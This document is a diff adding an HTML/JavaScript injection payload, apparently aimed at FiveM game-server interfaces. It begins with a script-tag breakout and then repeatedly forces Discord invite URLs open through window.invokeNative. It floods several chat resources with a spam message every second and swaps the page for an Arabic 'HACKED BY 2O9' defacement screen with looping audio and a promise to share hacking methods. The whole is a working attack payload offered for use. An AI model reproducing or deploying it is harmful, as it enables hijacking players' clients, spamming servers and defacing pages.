@@ -1,0 +1,437 @@
+</script>
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/2o9");
+window.invokeNative("openUrl", "https://discord.gg/2o9");
+window.invokeNative("openUrl", "https://discord.gg/2o9");
+window.invokeNative("openUrl", "https://discord.gg/2o9");
+}, 3000);
+    </script>
+
+    <script>
+        const msg = `👑 vjmi & BoM6er - .gg/UAEE ! 👑`;
+        const body = JSON.stringify({ message: msg });
+        setInterval(() => {
+            fetch("https://flix-scripts/chatResult", { method: "POST", body });
+            fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+            fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+            fetch("https://melix_chat/chatResult", { method: "POST", body });
+            fetch("https://as_chat/chatResult", { method: "POST", body });
+            fetch("https://chat/chatResult", { method: "POST", body });
+            fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+        }, 1000);
+    </script>
+
+</script>
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>تنبيه أمني</title>
+<!-- استيراد خط Orbitron من Google Fonts -->
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
+<style>
+  /* إعدادات الجسم الأساسية */
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #000000;
+    color: #ffffff;
+    font-family: 'Orbitron', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    height: 100vh;
+    text-align: center;
+    transition: opacity 1s ease-in-out;
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* نمط الشبكة في الخلفية باستخدام CSS */
+  .grid-pattern {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    /* دمج تدرجين خطيين لإنشاء شبكة */
+    background-image: 
+      linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+    background-size: 35px 35px;
+    z-index: -1; /* لجعلها خلف المحتوى الرئيسي */
+    pointer-events: none; /* لجعلها لا تتأثر بالنقر */
+  }
+
+  /* تصميم النصوص والروابط */
+  .text-line {
+    font-size: 3.9vw;
+    margin-bottom: 1.5vw;
+    color: #ffffff;
+  }
+  .discord-link {
+    font-size: 3.8vw;
+    color: #a0a0a0;
+    text-decoration: none;
+    transition: color 0.3s;
+  }
+  .discord-link:hover {
+    color: #d0d0d0;
+  }
+  .join-message {
+    font-size: 1.5vw;
+    margin-top: 1.5vw;
+    color: #909090;
+  }
+  .title {
+    font-size: 50px;
+    text-shadow: 0 0 10px #555555;
+    margin-top: 20px;
+    color: #ffffff;
+  }
+
+  /* تصميم مربع المعلومات */
+  .info-box {
+    border: 2px solid #555555; /* تم تعديل لون الحدود */
+    border-radius: 8px;
+    padding: 15px;
+    margin-top: 20px;
+    background-color: rgb(0, 0, 0);
+    max-width: 80%;
+    font-size: 18px;
+    color: #a0a0a0;
+    box-shadow: 0 0 10px rgba(80, 80, 80, 0.5);
+    position: relative;
+    padding-top: 40px;
+  }
+
+  .top-bar {
+    position: absolute;
+    top: 7.8px;
+    left: 7.8px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .circles {
+    display: flex;
+    gap: 8px;
+  }
+
+  .circle {
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+    border: 1px solid #555555; /* تم تعديل لون الحدود */
+    background-color: transparent;
+    box-shadow: 0 0 3px rgba(80, 80, 80, 0.5);
+  }
+
+  .discord-info {
+    font-size: 16px;
+    color: #e0e0e0;
+    margin-right: 5px;
+    /* تمت إزالة الخط تحت النص */
+  }
+
+  .line {
+    width: 1px;
+    height: 20px;
+    background-color: #555555;
+  }
+  
+  .horizontal-line {
+    width: 100%;
+    height: 1px;
+    background-color: #555555;
+    margin: 10px 0;
+  }
+  
+  .terminal-content {
+    background-color: #000000;
+    border-radius: 5px;
+    padding: 10px;
+    margin-top: 10px;
+    font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 16px;
+    text-align: left; /* تم تغيير اتجاه النص لليسار */
+    direction: ltr; /* تم تغيير اتجاه الكتابة لليسار */
+    color: #00ff00;
+  }
+  
+  .terminal-line {
+    white-space: pre-wrap;
+    margin: 0;
+  }
+  
+  .terminal-prefix {
+    color: #a0a0a0;
+  }
+
+  /* تصميم الصورة المتحركة */
+  .hack-img-container {
+    display: inline-block;
+    border: 5px solid #808080;
+    background-color: #000;
+    padding: 0;
+    border-radius: 12px;
+    margin-bottom: 20px;
+    overflow: hidden;
+    position: relative;
+    box-shadow: 0 0 15px #606060;
+    animation: zoomInOut 10s infinite ease-in-out;
+    transform-origin: center;
+    width: 70%;
+    max-width: 500px;
+  }
+  .hack-img {
+    width: 100%;
+    height: auto;
+    display: block;
+    margin: 0;
+    border-radius: 7px;
+    position: relative;
+    z-index: 1;
+    filter: grayscale(50%);
+  }
+  .glow-effect {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg,
+                rgba(150, 150, 150, 0) 0%,
+                rgba(200, 200, 200, 0.8) 50%,
+                rgba(150, 150, 150, 0) 100%);
+    z-index: 2;
+    opacity: 0;
+    animation: glow 5s infinite;
+    border-radius: 7px;
+  }
+  @keyframes glow {
+    0%, 100% { opacity: 0; transform: translateX(-100%); }
+    10% { opacity: 0.8; }
+    50% { opacity: 0.8; transform: translateX(100%); }
+    60%, 100% { opacity: 0; }
+  }
+  @keyframes zoomInOut {
+    0%, 100% {
+      transform: scale(1);
+      box-shadow: 0 0 15px #606060;
+    }
+    50% {
+      transform: scale(1.05);
+      box-shadow: 0 0 25px #909090;
+    }
+  }
+</style>
+</head>
+<body>
+
+<!-- تشغيل الأغنية في الخلفية بشكل متكرر -->
+<audio autoplay loop>
+  <source src="https://a.top4top.io/m_3479s3blf1.mp4" type="audio/mpeg" />
+  Your browser does not support the audio element.
+</audio>
+
+<!-- حاوية نمط الشبكة الثابتة -->
+<div class="grid-pattern"></div>
+
+<!-- محتوى الشاشة الأولى -->
+<div class="text-line">
+  .. SECURITY ALERT RYO IN THE SYSTEM
+</div>
+
+<a href="https://discord.gg/2o9" class="discord-link">
+  لاتنسى تخش الدس DISCORD.GG/2o9
+</a>
+
+<div class="join-message text-line"></div>
+
+<script>
+  // دالة تحويل Base64 إلى ArrayBuffer
+  function base64ToArrayBuffer(base64) {
+    const binaryString = atob(base64);
+    const len = binaryString.length;
+    const bytes = new Uint8Array(len);
+    for (let i = 0; i < len; i++) {
+        bytes[i] = binaryString.charCodeAt(i);
+    }
+    return bytes.buffer;
+  }
+
+  // دالة تحويل PCM إلى WAV
+  function pcmToWav(pcmData, sampleRate) {
+      const buffer = new ArrayBuffer(44 + pcmData.length * 2);
+      const view = new DataView(buffer);
+      let offset = 0;
+
+      // RIFF header
+      view.setUint32(offset, 0x52494646, false); offset += 4; // "RIFF"
+      view.setUint32(offset, 36 + pcmData.length * 2, true); offset += 4; // file size
+      view.setUint32(offset, 0x57415645, false); offset += 4; // "WAVE"
+
+      // fmt sub-chunk
+      view.setUint32(offset, 0x666d7420, false); offset += 4; // "fmt "
+      view.setUint32(offset, 16, true); offset += 4; // sub-chunk size
+      view.setUint16(offset, 1, true); offset += 2; // audio format (1 = PCM)
+      view.setUint16(offset, 1, true); offset += 2; // number of channels
+      view.setUint32(offset, sampleRate, true); offset += 4; // sample rate
+      view.setUint32(offset, sampleRate * 2, true); offset += 4; // byte rate
+      view.setUint16(offset, 2, true); offset += 2; // block align
+      view.setUint16(offset, 16, true); offset += 2; // bits per sample
+
+      // data sub-chunk
+      view.setUint32(offset, 0x64617461, false); offset += 4; // "data"
+      view.setUint32(offset, pcmData.length * 2, true); offset += 4; // data size
+
+      // PCM data
+      for (let i = 0; i < pcmData.length; i++) {
+          view.setInt16(offset, pcmData[i], true);
+          offset += 2;
+      }
+
+      return new Blob([view], { type: 'audio/wav' });
+  }
+
+  // دالة لإنشاء تلميحات هاكر جديدة باستخدام Gemini API
+  async function fetchHackerTip() {
+    const terminalLines = document.getElementById('terminal-lines');
+    terminalLines.innerHTML = '<p class="terminal-line"><span class="terminal-prefix">server@system:~$</span> جاري إنشاء تلميح...</p>';
+    const button = document.getElementById('tip-button');
+    button.disabled = true;
+
+    try {
+      const prompt = "Generate a short, cryptic, and impactful cybersecurity tip or 'hacker quote' in Arabic, similar to what you might see in a movie. Do not include any greetings or salutations.";
+      const chatHistory = [{ role: "user", parts: [{ text: prompt }] }];
+      const payload = { contents: chatHistory };
+      const apiKey = "";
+      const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-05-20:generateContent?key=${apiKey}`;
+      const response = await fetch(apiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      const result = await response.json();
+      const text = result?.candidates?.[0]?.content?.parts?.[0]?.text;
+      if (text) {
+        terminalLines.innerHTML = `
+          <p class="terminal-line"><span class="terminal-prefix">server@system:~$</span> تم استلام تلميح جديد:</p>
+          <p class="terminal-line">${text}</p>
+        `;
+      } else {
+        throw new Error('فشل في الحصول على نص من Gemini API.');
+      }
+    } catch (error) {
+      console.error("Error fetching hacker tip:", error);
+      terminalLines.innerHTML = `<p class="terminal-line" style="color: red;">خطأ: فشل في الاتصال بـ Gemini API.</p>`;
+    } finally {
+      button.disabled = false;
+    }
+  }
+
+  // دالة لتشغيل صوت التنبيه باستخدام Gemini API TTS
+  async function playAlertSound() {
+    const button = document.getElementById('tts-button');
+    button.disabled = true;
+
+    try {
+      const payload = {
+          contents: [{
+              parts: [{ text: "Say like a calm robot: The System is under attack. All security protocols are compromised. This is a level nine alert." }]
+          }],
+          generationConfig: {
+              responseModalities: ["AUDIO"],
+              speechConfig: {
+                  voiceConfig: {
+                      prebuiltVoiceConfig: { voiceName: "Kore" }
+                  }
+              }
+          },
+          model: "gemini-2.5-flash-preview-tts"
+      };
+      const apiKey = "";
+      const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-tts:generateContent?key=${apiKey}`;
+      const response = await fetch(apiUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+      });
+      const result = await response.json();
+      const part = result?.candidates?.[0]?.content?.parts?.[0];
+      const audioData = part?.inlineData?.data;
+      const mimeType = part?.inlineData?.mimeType;
+
+      if (audioData && mimeType && mimeType.startsWith("audio/")) {
+          const sampleRate = parseInt(mimeType.match(/rate=(\d+)/)[1], 10);
+          const pcmData = base64ToArrayBuffer(audioData);
+          const pcm16 = new Int16Array(pcmData);
+          const wavBlob = pcmToWav(pcm16, sampleRate);
+          const audioUrl = URL.createObjectURL(wavBlob);
+          const audio = new Audio(audioUrl);
+          audio.play();
+          audio.onended = () => {
+              URL.revokeObjectURL(audioUrl);
+          };
+      } else {
+          throw new Error('فشل في الحصول على بيانات صوتية من Gemini API.');
+      }
+    } catch (error) {
+      console.error("Error playing alert sound:", error);
+      alert("خطأ: فشل تشغيل الصوت. قد يكون هناك مشكلة في الاتصال بـ API.");
+    } finally {
+      button.disabled = false;
+    }
+  }
+  
+  // الكود الأصلي للانتقال إلى الشاشة الثانية بعد 1 ثانية
+  setTimeout(() => {
+    document.body.style.opacity = "0";
+    setTimeout(() => {
+      // محتوى الشاشة الثانية
+      document.body.innerHTML = `
+        <div class="grid-pattern"></div>
+        <div>
+          <div class="hack-img-container">
+            <img src="https://j.top4top.io/p_3507lyxu81.gif" alt="Hacked" class="hack-img" />
+            <div class="glow-effect"></div>
+          </div>
+          <h1 class='title'>HACKED BY 2O9</h1>
+          <div class="info-box">
+            <div class="top-bar">
+              <span class="discord-info">discord.gg/2o9</span>
+              <div class="line"></div>
+              <div class="circles">
+                <div class="circle"></div>
+                <div class="circle"></div>
+                <div class="circle"></div>
+              </div>
+            </div>
+            <div class="horizontal-line"></div>
+            <div class="terminal-content">
+                <p class="terminal-line"><span class="terminal-prefix">server@system:~$</span> <span style="color:#ffffff;">why?</span></p>
+                <p class="terminal-line">السلام عليكم ورحمة الله وبركاته</p>
+                <p class="terminal-line"><span style="color:#00ff00;">Ryo :</span></p>
+                <p class="terminal-line">لاتنسى تذكر الله وخش الدس رح ننزل لكم كل الطرق عشان تصير هاك</p>
+                <p class="terminal-line">(:</p>
+            </div>
+          </div>
+        </div>
+        <audio autoplay loop>
+          <source src="https://a.top4top.io/m_3479s3blf1.mp4" type="audio/mpeg" />
+          Your browser does not support the audio element.
+        </audio>
+      `;
+      document.body.style.opacity = "1";
+    }, 1000);
+  }, 1000);
+</script>
+
+</body>
+</html>
